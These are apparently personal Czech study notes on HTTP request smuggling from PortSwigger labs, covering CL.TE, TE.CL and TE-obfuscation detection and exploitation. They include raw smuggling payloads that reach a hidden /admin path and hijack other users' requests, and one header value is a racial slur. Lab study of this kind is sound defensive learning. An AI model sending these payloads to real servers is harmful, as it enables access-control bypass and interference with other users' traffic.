---
date: 2026-02-01T13:08
cssclasses:
  - embed-white
---

- http server zpracovává requesty v pořadí jak příjdou, netuší, který patří jakému klientu
- můžeme takhle přesvědčit server, že request poslal někdo jiný (např. přilepíme request na request, který přijde hned po nás) nebo obejít frontend a komunikovat přímo s backendem
![[request smuggle example.png]]
## Principy
- http requesty mohou definovat velikost pomocí `Content-Lenght` či pomocí `Transfer-Encoding`
- zneužíváme rozlišnosti v handlování těchto dvou headerů na frontendu a backendu

- můžeme přesvědčit backend, že toho má přijít více pokud je na tohle vulnerable. tím backend čeká na další request s dodatečným body

## Identifikace vulnerability
- CL.TE = frontend preferuje/pouze používá`Content-Lenght` a backend preferuje/přijímá pouze `Transfer-Encoding`
- mezi hlavičkou a tělem HTTP requestu musí být řádek (třeba 2 hodiny researche tady xd)
- trailing v hostu `/` mi dělá neplechu, takže ho tam nedávej :D
- (To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.)
### CL.TE vuln - timing
- frontend pošle kompletní zprávu, která má 4 bity, ale backend čeká na ukončující `0` na t-e chunked
- pokud je site vulnerable bude server timeout po několika sekundách
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

### TE.CL vuln
- FE odešle pouze část po 0, BE čeká na zbytek bitů do 6
- tohle potenciálně zaznamenají ostatní uživatelé, je lepší nejdřív zkoušet variantu CL.TE
- pokud to vrátí okay, backend taky preferuje TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

- pokud frontend preferuje TE, vrátí invalid request
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 6
Transfer-Encoding: chunked
Content-Length: 11

3
abc
X

```
### TE obfuscation
- trickneme backend, aby používal CL nějakým dojebem TE headeru
- pokud je frontend lenientnější, pošle tohle v pohodě na backend s tím, že to je chill TE chunked, ale backend se z druhého TE podělá a radši použije CL, který ho donutí timeoutnout
- pokud je tohle úspěšné, dá se exploitnout stejně jako TE.CL útok
```
POST / HTTP/1.1
Host: 0a2500e804ab84f4808ef37100c400a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: niga
Content-Lenght: 6

0

X
```
## Zneužití
### CL.TE
- tohle přepíše první řádek následujícího requestu (klidně od jiného uživatele) na `GET /404 HTTP/1.1`, ať uživatel requestoval jakoukoliv stránku
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```
- modifikovaný request victima:
```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
q=smuggling
```
#### PortSwigger lab payload
- X-bordel je obfuscated X-forwarded-host header, který jsme museli zjistit. je důležitý aby ten druhý request měl content length o 1 menší větší než body
```
POST / HTTP/1.1
Host: 0a560097034f33c784f768df009a00fa.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
X-yiLQPN-Ip: 127.0.0.1

ab
```

### TE.CL
- za poslední 0 je nutné přidat `\r\n\r\n`
- to `7c` musí matchovat v bytech body, co jde za ním
	- v burpsuite stačí označit payload od smuggled GET až po konec payloadu (před 0), vynechat `\r\n` na posledním řádku
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```
#### PortSwigger lab payload
- goal: redirectnout příští normální request na /404
- request se vrací jako normální GET
```
POST / HTTP/1.1
Host: 0aba004e04cab56a802367aa008600c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9e
GET /404 HTTP/1.1
Host: 0aba004e04cab56a802367aa008600c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```
## Methodology
### Nastavení Burpu
- downgrade HTTP protocol na HTTP/1.1
	- v request attributes
- nastavit metodu POST
- update Content-length vypnuto
- turn on non printable characters
	- ikona \n nad textem
- sanity check - zkontrolovat, že normální request funguje
### Detect
- [[HTTP Request Smuggling#CL.TE vuln - timing|CL.TE]] - exploit
	- response (backend) - CL.CL
	- reject (frontend) - TE.CL / TE.TE
		- tohle může být taky timeout, ale je rozdílný od toho backendového
	- timeout (backend) - CL.TE
- [[HTTP Request Smuggling#TE.CL vuln|TE.CL]] - exploit
	- response (backend)
		- CL.CL
		- TE.TE
	- timeout (frontend) - TE.CL / TE.TE
	- socket poison (backend) - CL.TE


---
https://portswigger.net/web-security/request-smuggling
labs: https://portswigger.net/web-security/all-labs#http-request-smuggling
